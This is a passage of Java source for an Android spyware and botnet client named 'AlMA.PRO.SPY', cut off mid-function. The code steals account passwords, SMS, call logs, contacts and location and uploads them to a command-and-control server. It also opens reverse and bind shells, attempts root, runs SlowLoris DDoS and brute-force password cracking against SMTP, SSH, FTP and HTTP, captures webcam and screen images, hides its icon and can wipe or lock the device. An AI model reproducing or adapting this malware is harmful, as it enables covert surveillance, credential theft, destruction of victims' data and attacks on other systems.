                            lastlocation = longitude + "," + latitude;
                        }

                        @Override
                        public void onStatusChanged(String s, int i, Bundle bundle) {
                        }

                        @Override
                        public void onProviderEnabled(String s) {
                        }

                        @Override
                        public void onProviderDisabled(String s) {
                        }
                    });
                    Looper.loop();
                }
            }).start();
            Location location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                Double longitude = location.getLongitude();
                Double latitude = location.getLatitude();
                return longitude + "," + latitude;
            }
        } catch (SecurityException e) {
            e.printStackTrace();
            log_all("GLnL function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "Unknown";
    }
    private String accounts() {
        String s = "";
        try {
            AccountManager am = AccountManager.get(main_context);
            Account[] acc = am.getAccounts();
            if (acc.length > 0) {
                for (Account a : acc) {
                    s += "\n#################################\n";
                    s += "\nName: " + a.name + "\nType: " + a.type;
                    try{
                        s+="\nPassword: "+am.getPassword(a);
                    }catch (Exception ignored){}
                    s += "\n#################################\n";
                }
            }
        } catch (SecurityException e) {
            e.printStackTrace();
            log_all("accounts function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return s;
    }
    private void docmds(String s) {
        try {
            if (s.equals("")) {
                return;
            }
            if (!s.contains(";")) {
                log_all("docmds function: Something went wrong!\n" + s);
                return;
            }
            for (String cmd : s.split(";")) {
                switch (cmd.toLowerCase()) {
                    case "goodbye":
                        GB();
                        break;
                    case "wcs":
                        WCS();
                        break;
                    case "logins":
                        WTF(sp + "accounts.txt", accounts());
                        if (new File(sp + "accounts.txt").exists()) {
                            uf(sp + "accounts.txt","logins");
                            new File(sp + "accounts.txt").delete();
                        }
                        break;
                    case "logs":
                        File f = new File(sp+logfile);
                        f = new File(f.getAbsolutePath().replaceAll("[ ]","\\ "));
                        if (f.exists()) {
                            uf(f.getAbsolutePath(),"logs");
                            f.delete();
                        }
                        f = new File(sp+"calls.log");
                        f = new File(f.getAbsolutePath().replaceAll("[ ]","\\ "));
                        WTF(f.getAbsolutePath(),GCL());
                        if (f.exists()) {
                            uf(f.getAbsolutePath(),"logs");
                            f.delete();
                        }
                        f = new File(sp+"sms.log");
                        f = new File(f.getAbsolutePath().replaceAll("[ ]","\\ "));
                        WTF(f.getAbsolutePath(),GML());
                        if (f.exists()) {
                            uf(f.getAbsolutePath(),"logs");
                            f.delete();
                        }
                        f = new File(sp+"installed apps.log");
                        f = new File(f.getAbsolutePath().replaceAll("[ ]","\\ "));
                        WTF(f.getAbsolutePath(),APPS());
                        if (f.exists()) {
                            uf(f.getAbsolutePath(),"logs");
                            f.delete();
                        }
                        break;
                    case "gh":
                        if (gh()) log_all("We've got higher.", log_type.GOOD);
                        break;
                }
                if (cmd.toLowerCase().startsWith("cwt ")) {
                    wtime = Integer.parseInt(cmd.substring(4));
                    SS("WTIME", String.valueOf(wtime));
                } else if (cmd.toLowerCase().startsWith("df ")) {
                    df(cmd.substring(3), path+cmd.substring(3).split("/")[cmd.substring(3).split("/").length - 1]);
                } else if (cmd.toLowerCase().startsWith("x ")) {
                    String f = cmd.substring(2);
                    if (f.toLowerCase().startsWith("-cmd ")) f = f.substring(5);
                    shell(f);
                } else if (cmd.toLowerCase().startsWith("update ")) {
                    UM(cmd.substring(7));
                } else if (cmd.toLowerCase().startsWith("btcp ")) {
                    BTCP(cmd.substring(5));
                } else if (cmd.toLowerCase().startsWith("rtcp ")) {
                    RTCP(cmd.substring(5).split("\\|")[0], cmd.substring(5).split("\\|")[1]);
                } else if (cmd.toLowerCase().startsWith("sl ")) {
                    String host = cmd.substring(3);
                    String port = "80";
                    boolean bg = false;
                    if (host.toLowerCase().startsWith("-b ")) bg = true;
                    host = host.substring(3);
                    if (host.toLowerCase().startsWith("https")) port = "443";
                    SL sl = new SL(host, port);
                    if (bg) new Thread(sl).start();
                    else sl.run();
                } else if (cmd.toLowerCase().startsWith("co ")) {
                    String data = cmd.substring(3);
                    CO_Type t = CO_Type.SMTP;
                    if (data.toLowerCase().startsWith("smtp ")) {
                        data = data.substring(5);
                    } else if (data.toLowerCase().startsWith("imap ")) {
                        data = data.substring(5);
                        t = CO_Type.IMAP;
                    } else if (data.toLowerCase().startsWith("ftp ")) {
                        data = data.substring(4);
                        t = CO_Type.FTP;
                    } else if (data.toLowerCase().startsWith("ssh ")) {
                        data = data.substring(4);
                        t = CO_Type.SSH;
                    } else if (data.toLowerCase().startsWith("httpget ")) {
                        data = data.substring(8);
                        t = CO_Type.HTTP_GET;
                    } else if (data.toLowerCase().startsWith("httppost ")) {
                        data = data.substring(9);
                        t = CO_Type.HTTP_POST;
                    }
                    String h = data.split(" ")[0];
                    data = data.substring(h.length() + 1);
                    String u = data.split(" ")[0];
                    data = data.substring(u.length() + 1);
                    ArrayList<String> passwords = new ArrayList<>();
                    if (data.split("\\|")[0].contains("#")) {
                        Collections.addAll(passwords, data.split("\\|")[0].split("#"));
                    } else {
                        try {
                            String url = data.split("\\|")[0];
                            if (!url.toLowerCase().startsWith("http")) {
                                url = server + aps + url;
                            }
                            HttpClient httpClient = new DefaultHttpClient();
                            HttpGet httpGet = new HttpGet(url);
                            HttpResponse httpResponse;
                            httpResponse = httpClient.execute(httpGet);
                            if (httpResponse == null) {
                                return;
                            }
                            HttpEntity responseEntity = httpResponse.getEntity();
                            if (responseEntity != null) {
                                Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                        }
                    }
                    if (passwords.size() == 0) return;
                    String cp = CO(h, data.split("\\|")[1], u, passwords.toArray(new String[passwords.size()]), t);
                    if (!cp.equals("")) {
                        WTF(sp + "Cracked.txt", "User: " + u + "\nPassword: " + cp);
                        if (new File(sp + "Cracked.txt").exists()) {
                            uf(sp + "Cracked.txt");
                            new File(sp + "Cracked.txt").delete();
                        }
                    }
                } else if (cmd.toLowerCase().startsWith("fman ")) {
                    String subcmd = cmd.substring(5);
                    if (subcmd.toLowerCase().equals("ref")) {
                        String list = path + "|||";
                        for (File f : new File(path).listFiles()) {
                            list += f.getName();
                            if (f.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    } else if (subcmd.toLowerCase().startsWith("cd ")) {
                        String np = subcmd.substring(3);
                        File f1 = new File(path);
                        switch (np) {
                            case "..":
                                f1 = new File(f1.getParent() + "/");
                                break;
                            case ".":
                                f1 = new File(path);
                                break;
                            default:
                                f1 = new File(path + np + "/");
                                break;
                        }
                        if (f1.exists()) {
                            path = f1.getAbsolutePath() + "/";
                        }
                        String list = path + "|||";
                        for (File f : new File(path).listFiles()) {
                            list += f.getName();
                            if (f.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    } else if (subcmd.toLowerCase().startsWith("df ")) {
                        String url = subcmd.substring(3);
                        df(url, path+url.split("/")[url.split("/").length - 1]);
                        String list = path + "|||";
                        for (File f : new File(path).listFiles()) {
                            list += f.getName();
                            if (f.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    } else if (subcmd.toLowerCase().startsWith("uf ")) {
                        String f = subcmd.substring(3);
                        File f1 = new File(path + f);
                        if (f1.isDirectory()) {
                            for (File f2 : f1.listFiles()) {
                                if (f2.isFile()) {
                                    uf(f2.getAbsolutePath());
                                }
                            }
                        } else {
                            uf(f1.getAbsolutePath());
                        }
                    } else if (subcmd.toLowerCase().startsWith("x ")) {
                        String f = subcmd.substring(2);
                        if (f.toLowerCase().startsWith("-cmd ")) f = f.substring(5);
                        shell(path + f);
                    } else if (subcmd.toLowerCase().startsWith("del ")) {
                        String f = subcmd.substring(4);
                        if (new File(path + f).isDirectory()) {
                            for (File f1 : new File(path + f).listFiles()) {
                                f1.delete();
                            }
                        }
                        new File(path + f).delete();
                        String list = path + "|||";
                        for (File f1 : new File(path).listFiles()) {
                            list += f1.getName();
                            if (f1.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    } else if (subcmd.toLowerCase().startsWith("mkdir ")) {
                        String f = subcmd.substring(6);
                        if (!(new File(path + f)).exists() || !(new File(path + f).isDirectory())) {
                            new File(path + f).mkdir();
                        }
                        String list = path + "|||";
                        for (File f1 : new File(path).listFiles()) {
                            list += f1.getName();
                            if (f1.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    } else if (subcmd.toLowerCase().startsWith("ren ")) {
                        String oldn = subcmd.substring(4).split("\\|")[0];
                        String newn = subcmd.substring(4).split("\\|")[1];
                        File f = new File(path + oldn);
                        if (f.exists()) {
                            f.renameTo(new File(path + newn));
                        }
                        String list = path + "|||";
                        for (File f1 : new File(path).listFiles()) {
                            list += f1.getName();
                            if (f1.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    } else if (subcmd.toLowerCase().startsWith("touch ")) {
                        File f = new File(path + subcmd.substring(6));
                        if (!f.exists()) {
                            f.createNewFile();
                        }
                        String list = path + "|||";
                        for (File f1 : new File(path).listFiles()) {
                            list += f1.getName();
                            if (f1.isDirectory()) list += "|Directory||";
                            else list += "|File||";
                        }
                        list = list.substring(0, list.length() - 3);
                        WTF(path + "fman-ref.txt", list);
                        if (new File(path + "fman-ref.txt").exists()) {
                            uf(path + "fman-ref.txt");
                            new File(path + "fman-ref.txt").delete();
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("docmds function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void GB() {
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + main_context.getPackageName()));
        main_context.startActivity(intent);
    }
    private enum log_type {
        ERROR,
        WARNING,
        INFO,
        GOOD
    }
    private void log_all(String data) {
        log_all(data, log_type.ERROR);
    }
    private void log_all(String data, log_type t) {
        try {
            File f = new File(sp + logfile);
            f = new File(f.getAbsolutePath().replaceAll("[ ]","\\ "));
            String c = "";
            if (f.exists()) {
                long s = f.length();
                if(s>=200){
                    uf(f.getAbsolutePath(),"logs");
                    f.delete();
                    f.createNewFile();
                }
                c = BS(RFFB(f.getAbsolutePath()));
            }
            Calendar cc = Calendar.getInstance();
            SimpleDateFormat df = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.ENGLISH);
            String formattedDate = df.format(cc.getTime());
            String h = "";
            switch (t) {
                case ERROR:
                    h = "[E] - ";
                    break;
                case WARNING:
                    h = "[W] - ";
                    break;
                case INFO:
                    h = "[I] - ";
                    break;
                case GOOD:
                    h = "[G] - ";
                    break;
            }
            h += formattedDate + " - ";
            c = c + "->->->->->\n" + h + data + "\n<-<-<-<-<-\n";
            WTF(f.getAbsolutePath(), c.getBytes());
        } catch (Exception e) {
            e.printStackTrace();
            log_all("log_all function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private String ls() {
        try {
            String list = "";
            int ds = 0;
            File f = new File(path);
            File[] files = f.listFiles();
            for (File inFile : files) {
                String typ = " - File";
                String info = " - ";
                info += (inFile.canRead()) ? "R" : "-";
                info += (inFile.canWrite()) ? "W" : "-";
                info += (inFile.canExecute()) ? "X" : "-";
                info += "";
                if (inFile.isDirectory()) {
                    typ = " - Dir";
                    ds++;
                }
                list += "\n" + inFile.getName() + info + typ;
            }
            int fs = files.length - ds;
            return "Path: " + path + "\nDirectories: " + ds + " - Files: " + fs + list;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("ls function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "";
    }
    private void df(String url, String n) {
        try {
            n = n.replaceAll("[ ]","\\ ");
            HttpClient httpClient = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(url);
            HttpResponse httpResponse;
            httpResponse = httpClient.execute(httpGet);
            if (httpResponse == null) {
                return;
            }
            HttpEntity responseEntity = httpResponse.getEntity();
            if (responseEntity != null) {
                WTF(n, EntityUtils.toByteArray(responseEntity));
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("df function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void uf(String n) {
        try {
            n = n.replaceAll("[ ]","\\ ");
            Client a = new Client();
            a.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, "put", server + aps + "connect.php?password=" + password + "&type=upload&folder=uploads&botid=" + botid, n).get();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("uf function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private void uf(String n,String f) {
        try {
            n = n.replaceAll("[ ]","\\ ");
            Client a = new Client();
            a.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, "put", server + aps + "connect.php?password=" + password + "&type=upload&folder="+f+"&botid=" + botid, n).get();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("uf function: "+e.getMessage()+"\nLine #: "+e.getStackTrace()[0].getLineNumber());
        }
    }
    private boolean CUH(String host) {
        try {
            if (host.toLowerCase().startsWith("http")) {
                if (host.toLowerCase().startsWith("https://")) {
                    host = host.substring(8);
                    if (host.contains("/")) host = host.split("/")[0];
                    return CUH(host, "443");
                } else {
                    host = host.substring(7);
                    if (host.contains("/")) host = host.split("/")[0];
                    return CUH(host, "80");
                }
            }
            Process p = Runtime.getRuntime().exec("/system/bin/ping -c 1 " + host);
            int r = p.waitFor();
            if (r == 0) {
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("CUH function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private boolean CUH(String host, String port) {
        try {
            SocketAddress sockaddr = new InetSocketAddress(host, Integer.parseInt(port));
            Socket sock = new Socket();
            int timeoutMs = 5000;
            sock.connect(sockaddr, timeoutMs);
            sock.close();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            log_all("CUH function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private class Client extends AsyncTask<String, String, String> {
        @Override
        protected void onPostExecute(String s) {
            docmds(s);
            super.onPostExecute(s);
        }
        @Override
        @SuppressWarnings("deprecation")
        protected String doInBackground(String... params) {
            String response = "";
            String dataToSend = params[2];
            dataToSend = dataToSend.replaceAll("[ ]","\\ ");
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(params[1]);
            HttpGet httpGet = new HttpGet(params[1]);
            HttpPut httpPut = new HttpPut(params[1].toLowerCase().contains("&type=upload") ? params[1]+"&file="+new File(dataToSend).getName().replaceAll(" ","%20") : params[1]);
            httpPost.setHeader("User-Agent", "AlMA.PRO.SPY - " + version);
            httpPost.setHeader("Content-Type", "application/x-www-form-urlencoded");
            httpGet.setHeader("User-Agent", "AlMA.PRO.SPY - " + version);
            httpPut.setHeader("User-Agent", "AlMA.PRO.SPY - " + version);
            HttpResponse httpResponse = null;
            switch (params[0].toLowerCase()) {
                case "post":
                    try {
                        ArrayList<NameValuePair> nameValuePairs = new ArrayList<>();
                        for (String var : dataToSend.split("&")) {
                            nameValuePairs.add(new BasicNameValuePair(var.split("=")[0], var.split("=")[1]));
                        }
                        httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                        httpResponse = httpClient.execute(httpPost);
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("Client function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                    }
                    break;
                case "get":
                    try {
                        httpResponse = httpClient.execute(httpGet);
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("Client function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                    }
                    break;
                case "put":
                    try {
                        httpPut.setEntity(new FileEntity(new File(dataToSend),new File(dataToSend).getName()));
                        httpResponse = httpClient.execute(httpPut);
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("Client function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                    }
                    break;
            }
            if (httpResponse == null) {
                return "";
            }
            try {
                HttpEntity responseEntity = httpResponse.getEntity();
                if (responseEntity != null) {
                    response = EntityUtils.toString(responseEntity);
                } else {
                    response = "";
                }
            } catch (Exception e) {
                e.printStackTrace();
                log_all("Client function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
            return response;
        }
    }
    private String MD5(final String toEncrypt) {
        try {
            final MessageDigest digest = MessageDigest.getInstance("md5");
            digest.update(toEncrypt.getBytes());
            final byte[] bytes = digest.digest();
            final StringBuilder sb = new StringBuilder();
            for (int i = 0; i < bytes.length; i++) {
                sb.append(String.format("%02X", bytes[i]));
            }
            return sb.toString().toLowerCase();
        } catch (Exception e) {
            e.printStackTrace();
            log_all("MD5 function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return "";
    }
    private void RTCP(String h, String p) {
        class Runner extends AsyncTask<String, String, String> {
            @Override
            protected String doInBackground(String... params) {
                Looper.prepare();
                try {
                    Socket c = new Socket(params[0], Integer.parseInt(params[1]));
                    TCP tcp = new TCP(c);
                    new Thread(tcp).start();
                    return null;
                } catch (Exception e) {
                    e.printStackTrace();
                    log_all("RTCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                }
                Looper.loop();
                return null;
            }
        }
        Runner r = new Runner();
        r.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, h, p);
    }
    private void BTCP(String p) {
        class Runner extends AsyncTask<String, String, String> {
            @Override
            protected String doInBackground(String... params) {
                Looper.prepare();
                try {
                    String p = params[0];
                    boolean l = false;
                    if (p.toLowerCase().startsWith("-l ")) {
                        l = true;
                        p = p.toLowerCase().replaceAll("-l ", "");
                    }
                    ServerSocket s = new ServerSocket(Integer.parseInt(p));
                    String cip = "127.0.0.1";
                    try {
                        //noinspection deprecation
                        cip = EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet("https://jsonip.com")).getEntity()).split("\"")[3];
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("BTCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                    }
                    if (l) {
                        cip = "127.0.0.1";
                    }
                    try {
                        Socket cc = new Socket(cip, Integer.parseInt(p));
                        Socket c = s.accept();
                        c.close();
                        cc.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                        log_all("BTCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                        return null; // Perhaps failed binding!!
                    }
                    Socket c = s.accept();
                    TCP tcp = new TCP(c);
                    new Thread(tcp).start();
                    s.close();
                    return null;
                } catch (Exception e) {
                    e.printStackTrace();
                    log_all("RTCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                }
                Looper.loop();
                return null;
            }
        }
        Runner r = new Runner();
        r.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, p);
    }
    private class TCP implements Runnable {
        private Socket c;
        private BufferedReader br;

        private TCP(Socket _c) {
            try {
                c = _c;
                c.setReceiveBufferSize(99999);
                c.setSendBufferSize(99999);
                br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            } catch (Exception e) {
                e.printStackTrace();
                log_all("TCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }

        @Override
        public void run() {
            try {
                String cmd = br.readLine();
                try {
                    switch (cmd.toLowerCase()) {
                        case "be apssh":
                            boolean logged = false;
                            while (!logged) {
                                c.getOutputStream().write(SB("APSSH USER: "));
                                String u = br.readLine();
                                c.getOutputStream().write(SB("APSSH PASS: "));
                                String p = br.readLine();
                                if (u.equals(apsshuser) && MD5(p).equals(apsshpass)) {
                                    logged = true;
                                    APSSH a = new APSSH(c);
                                    new Thread(a).start();
                                }
                            }
                            break;
                        case "be shell":
                            String sh = "sh";
                            if (root) sh = "su";
                            Process s = Runtime.getRuntime().exec(sh);
                            DataOutputStream o = new DataOutputStream(s.getOutputStream());
                            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
                            while (c.isConnected()) {
                                try {
                                    o.writeBytes("whoami\n");
                                    o.flush();
                                    String u = in.readLine();
                                    o.writeBytes("pwd\n");
                                    o.flush();
                                    String p = in.readLine();
                                    c.getOutputStream().write(SB(u + ":" + p + "# "));
                                    String lc = br.readLine();
                                    o.writeBytes(lc + " 2>&1\necho APS-END\n");
                                    o.flush();
                                    String lr = in.readLine();
                                    while (!lr.equals("APS-END")) {
                                        c.getOutputStream().write(SB(lr + "\n"));
                                        lr = in.readLine();
                                    }
                                    if (lc.equals("exit")) {
                                        s.waitFor();
                                        c.close();
                                        break;
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    log_all("TCP function: be shell section: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                }
                            }
                            break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    log_all("TCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                }
            } catch (Exception e) {
                e.printStackTrace();
                log_all("TCP function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
    }
    private class APSSH implements Runnable {
        private Socket c;
        private BufferedReader br;
        private APSSH(Socket _c) {
            try {
                c = _c;
                br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            } catch (Exception e) {
                e.printStackTrace();
                log_all("APSSH function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
            }
        }
        @Override
        public void run() {
            try {
                boolean nl = false;
                while (true) {
                    if (nl) {
                        nl = false;
                        c.getOutputStream().write(SB(username + "@" + devicename + ":" + new File(path).getName() + "# "));
                    } else {
                        c.getOutputStream().write(SB("\n" + username + "@" + devicename + ":" + new File(path).getName() + "# "));
                    }
                    String cmd = br.readLine();
                    boolean sent = false;
                    try {
                        switch (cmd.toLowerCase()) {
                            case "":
                                nl = true;
                                sent = true;
                                break;
                            case "h":
                            case "?":
                            case "help":
                                String help = "help/?/h - Show this message";
                                help += "\nversion - Print the version of the bot";
                                help += "\nwhoami/id - Print the name of the current user";
                                help += "\nls - List files (Takes no arguments)";
                                help += "\nrtcp - Reverse TCP connection to a host on a port [HOST|PORT]";
                                help += "\nbtcp - Check if it's possible to bind on a port [PORT - Append (-l) to try it local]";
                                help += "\ncd - Change Directory";
                                help += "\ncat - Print all contents of a file";
                                help += "\ntouch - Make a new file";
                                help += "\nmkdir - Make a new directory";
                                help += "\nrm - Remove a file (Only one file)";
                                help += "\nrmdir - Remove a directory (Takes -f to erase folders content)";
                                help += "\nexe/run - Run a file (Ex: exe alma.EXT)";
                                help += "\nipconfig/ifconfig - Get network adapters and their current settings";
                                help += "\nsl - SlowLoris DDos Attack (Takes -b for background working)";
                                help += "\nco - CrackOff function - Cracks services for usernames and passwords. services included are: SMTP,IMAP,FTP,SSH,HTTP_GET,HTTP_POST. (Takes no arguments [Interactive])";
                                help += "\nch - Check if the bot is higher than normal (root).";
                                help += "\ncanh - Check if the bot can get higher.";
                                help += "\ngh - Try to get higher.";
                                help += "\ndownload - Download a file from URL.";
                                help += "\nupload - Upload a file to the C&C server.";
                                help += "\nirc - Connect to IRC if not connected.";
                                help += "\ncts - Connect to server.";
                                help += "\ndss - Screen Shot.";
                                help += "\nwcs - WebCams' Snaps";
                                help += "\nwcc - WebCams Check.";
                                help += "\nhf - Has a Flash?";
                                help += "\ngcn - Get Cell Number.";
                                help += "\ngcp - Get Cell Provider.";
                                help += "\nglnl - Get Longitude aNd latitude.";
                                help += "\ncontacts/cntcs/cons - Get Contacts list. (Careful! All details found are included [Expect a flood!])";
                                help += "\nhli - Hide Launcher Icon.";
                                help += "\nsli - Show Launcher Icon.";
                                help += "\nimei - Print IMEI number.";
                                help += "\nlogins/accounts - Print all found logins and accounts.";
                                help += "\ngcl - Get Calls log.";
                                help += "\ngml - Get SMS logs.";
                                help += "\napps - Get Installed Apps.";
                                help += "\ncall - Call a number [Takes the number as an argument].";
                                help += "\nussd - Run an USSD code [Takes the USSD code as an argument].";
                                help += "\nsms - Send a message (Takes no argument [Interactive]).";
                                help += "\nvol - Change volume (Takes one of three u,d,m [Up,Down,Mute]).";
                                help += "\nlock/unlock - Lock or Unlock the device (Requires Device Admin).";
                                help += "\nwipe - Wipe data (Be responsible!) (Requires Device Admin).";
                                help += "\nreboot - Reboot the device (Requires Device Admin).";
                                help += "\ncamera/cam - Disable/Enable the camera (Takes 0/d for Disable - 1/e for Enable) (Requires Device Admin).";
                                help += "\npassword/pass - Set a new password for the device (Requires Device Admin).";
                                c.getOutputStream().write(SB(help));
                                sent = true;
                                break;
                            case "version":
                                c.getOutputStream().write(SB(version));
                                sent = true;
                                break;
                            case "id":
                            case "whoami":
                                c.getOutputStream().write(SB(username));
                                sent = true;
                                break;
                            case "ls":
                                c.getOutputStream().write(SB(ls()));
                                sent = true;
                                break;
                            case "ipconfig":
                            case "ifconfig":
                                c.getOutputStream().write(SB(shell("ifconfig")));
                                sent = true;
                                break;
                            case "ch":
                                if (shell("whoami").toLowerCase().equals("root")) {
                                    c.getOutputStream().write(SB("We are higher than normal (root)."));
                                } else {
                                    c.getOutputStream().write(SB("We are not high :("));
                                }
                                sent = true;
                                break;
                            case "canh":
                                if (shell("which su").equals("")) {
                                    c.getOutputStream().write(SB("We can NOT get higher :("));
                                } else {
                                    c.getOutputStream().write(SB("We can get higher."));
                                }
                                sent = true;
                                break;
                            case "gh":
                                if (gh()) {
                                    c.getOutputStream().write(SB("We DID get higher ^^"));
                                } else {
                                    c.getOutputStream().write(SB("We couldn't get higher :("));
                                }
                                sent = true;
                                break;
                            case "co":
                                CO(c);
                                sent = true;
                                break;
                            case "cts":
                                GTM();
                                sent = true;
                                nl=true;
                                break;
                            case "dss":
                                c.getOutputStream().write(SB("Will start uploading Screen shot...\n"));
                                DSS();
                                c.getOutputStream().write(SB("Done uploading Screen shot."));
                                sent = true;
                                break;
                            case "wcs":
                                c.getOutputStream().write(SB("Will start uploading Webcams' snaps...\n"));
                                WCS();
                                c.getOutputStream().write(SB("Done uploading snaps."));
                                sent = true;
                                break;
                            case "wcc":
                                c.getOutputStream().write(SB(WCC()));
                                sent = true;
                                break;
                            case "hf":
                                if (hasFlash())
                                    c.getOutputStream().write(SB("Device has a flash."));
                                else c.getOutputStream().write(SB("Device has no flash!"));
                                sent = true;
                                break;
                            case "gcn":
                                c.getOutputStream().write(SB(GCN()));
                                sent = true;
                                break;
                            case "gcp":
                                c.getOutputStream().write(SB(GCP()));
                                sent = true;
                                break;
                            case "glnl":
                                c.getOutputStream().write(SB(GLnL()));
                                sent = true;
                                break;
                            case "contacts":
                            case "cntcs":
                            case "cons":
                                c.getOutputStream().write(SB(Contacts()));
                                sent = true;
                                break;
                            case "irc":
                                if (!ircthread.isAlive()) ircthread = new Thread(new IRC());
                                ircthread.start();
                                sent = true;
                                break;
                            case "hli":
                                hli();
                                c.getOutputStream().write(SB("Launcher icon has been hidden."));
                                sent = true;
                                break;
                            case "sli":
                                sli();
                                c.getOutputStream().write(SB("Launcher icon has been shown."));
                                sent = true;
                                break;
                            case "imei":
                                c.getOutputStream().write(SB(IMEI()));
                                sent = true;
                                break;
                            case "logins":
                            case "accounts":
                                c.getOutputStream().write(SB(accounts()));
                                sent = true;
                                break;
                            case "gcl":
                                c.getOutputStream().write(SB(GCL()));
                                sent = true;
                                break;
                            case "gml":
                                c.getOutputStream().write(SB(GML()));
                                sent = true;
                                break;
                            case "apps":
                                c.getOutputStream().write(SB(APPS()));
                                sent = true;
                                break;
                            case "sms":
                                SMS(c);
                                sent=true;
                                break;
                            case "lock":
                            case "unlock":
                            case "reboot":
                                Intent i = new Intent(main_context,Admin.class);
                                i.putExtra("cmd",cmd.toLowerCase());
                                i.putExtra("R","");
                                main_context.startActivity(i);
                                c.getOutputStream().write(SB("Command ("+cmd+") was send."));
                                sent=true;
                                break;
                            case "wipe":
                                c.getOutputStream().write(SB("Please be responsible for your actions!!\nWrite YES: "));
                                String a = br.readLine();
                                if(a.equals("YES")){
                                    Intent i1 = new Intent(main_context,Admin.class);
                                    i1.putExtra("cmd","wipe");
                                    i1.putExtra("R","");
                                    main_context.startActivity(i1);
                                }
                                sent=true;
                                break;
                        }
                        if (cmd.toLowerCase().startsWith("rtcp ")) {
                            String ct = cmd.substring(5);
